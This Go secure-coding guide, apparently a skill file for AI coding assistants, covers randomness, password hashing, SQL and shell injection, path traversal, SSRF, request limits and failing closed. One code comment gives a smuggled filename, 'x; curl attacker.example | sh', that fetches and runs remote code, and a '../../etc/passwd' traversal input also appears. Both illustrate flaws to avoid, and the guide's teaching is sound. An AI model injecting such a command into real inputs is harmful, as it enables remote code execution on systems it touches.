---
name: go-security
description: >-
  Go security practice for input from outside the process: crypto/rand and rand.Text for anything
  that grants access, TLS verification left on, bcrypt or argon2 for passwords and
  subtle.ConstantTimeCompare for secrets, parameterized SQL including ORDER BY and table names,
  exec.Command argument lists rather than a shell, html/template, os.Root against path traversal,
  SSRF checks in the dialer, bounded bodies and server timeouts, CSRF protection, secrets kept out
  of logs, govulncheck, and failing closed. Use when Go code handles a request body, a filename,
  a URL to fetch, an exec.Command argument, a password, a token, an upload or a template.
---

# Security

## Randomness

- **Anything that grants access comes from `crypto/rand`** — session IDs, reset tokens, API keys,
  nonces. `crypto/rand.Text()` returns a base32 string with at least 128 bits of randomness, which
  is the right default for a token.
- **`math/rand/v2` is for simulations, jitter and sampling** — never for a value an attacker gains
  by guessing. `gosec` G404 reports every call, so legitimate uses carry `//nolint:gosec // jitter,
  not a secret` — or the project excludes G404 for the one package that computes backoff.

## Secrets and Credentials

- **Passwords are hashed with an adaptive function** — `golang.org/x/crypto/bcrypt` or `argon2id` —
  never a bare SHA-256, salted or not: a GPU tries billions of SHA-256 guesses a second.
- **A secret is compared with `subtle.ConstantTimeCompare`**, never `==` or `bytes.Equal`, which
  return as soon as one byte differs and leak the prefix through timing. Compare hashes of equal
  length.
- **Secrets come from the environment or a secret store at startup**, never from code, a default,
  or a committed file; a type holding one redacts itself in logs (`errors.md`).
- **TLS verification stays on.** `InsecureSkipVerify: true` is a finding in every context outside
  a test against a throwaway certificate; trust a private CA by adding it to `RootCAs`.

## Injection

- **SQL takes parameters, always**: `db.QueryContext(ctx, "SELECT … WHERE email = $1", email)`.
  Identifiers cannot be parameters — an `ORDER BY` column or a table name is chosen from a fixed
  map of allowed values, never formatted in from input.
- **A subprocess gets an argument list, never a shell string**, and `--` before anything a user
  controls:

```go
// WRONG — a filename such as "x; curl attacker.example | sh" is a second command
cmd := exec.CommandContext(ctx, "sh", "-c", "git log --format=%H -- "+path)

// CORRECT — one argument per item, and "--" stops a name such as "-p" being read as an option
cmd := exec.CommandContext(ctx, "git", "log", "--format=%H", "--", path)
```

- **HTML is rendered with `html/template`**, which escapes by context — element, attribute, URL,
  script. `text/template` writing HTML is an XSS, and so is converting input to `template.HTML`.
- **Untrusted archives, images and XML are parsed with limits**: decompressed size capped by an
  `io.LimitReader`, image dimensions checked with `image.DecodeConfig` before `Decode`.

## Paths

- **A filename from outside is opened inside an `os.Root`** (Go 1.24): `root.Open(name)` refuses
  any name — `..`, an absolute path, a symlink — that resolves outside the root, which string
  checks on the joined path get wrong in both directions.

```go
// WRONG — "../../etc/passwd" is joined and cleaned into a path outside the upload directory
file, err := os.Open(filepath.Join(uploadDir, name))

// CORRECT — the root refuses any name that resolves outside it, symlinks included
root, err := os.OpenRoot(uploadDir)
if err != nil {
	return fmt.Errorf("open upload directory: %w", err)
}
defer root.Close()
file, err := root.Open(name)
```

- **`filepath.IsLocal(name)`** is the check when the name is only stored or forwarded, not opened.
- **An `embed.FS` or `fs.Sub` serves static files** — never `http.FileServer(http.Dir("."))` over a
  directory that also holds configuration.

## Outbound Requests to URLs from Input

A URL a user supplies — a webhook, an avatar, an import — can point at the metadata service, at
`localhost` or at the internal network. **The check belongs in the dialer**, after DNS resolution,
because a name that resolves to a public address at validation time can resolve to `127.0.0.1` at
connection time, and a redirect can go anywhere:

- **A `net.Dialer.Control` function rejects private, loopback, link-local and unspecified
  addresses** — `netip.Addr` has `IsPrivate`, `IsLoopback`, `IsLinkLocalUnicast`,
  `IsUnspecified` — and every redirect goes through the same dialer.
- **The client for such URLs is separate** from the one that talks to your own services, with a
  short timeout, a response size limit and a redirect limit.
- **Only `https`** — and `http` only where a test needs it — checked on the parsed `*url.URL`.

## Request Limits

- **Bodies are bounded, servers set their timeouts, and browser-facing state changes sit behind
  `http.CrossOriginProtection`** — the mechanics are in `go-boundaries` and `go-http`; a server
  without them is held open by a client that sends one byte a minute.
- **Cookies carrying a session are `Secure`, `HttpOnly` and `SameSite=Lax`** or stricter.

## Failing Closed

- **An authorization check that errors denies.** `allowed, err := policy.Allow(…)` with an error
  returns 500 or 403, never falls through to the handler.
- **A missing security setting stops startup** — no TLS certificate, no signing key, no allowed
  origins list — rather than running without it.
- **Errors returned to the client say what the client can fix**, nothing about the server: no
  stack trace, no SQL, no file path, no `err.Error()` of an internal failure.

## Dependencies

- **`govulncheck ./...` runs in CI** and reports only the vulnerabilities whose code the program
  actually reaches. A finding is fixed by upgrading; a suppression names the advisory and why the
  path is unreachable.
- **`gosec` runs with the other linters**, and a `//nolint:gosec` names the rule and the reason
  the input is trusted.
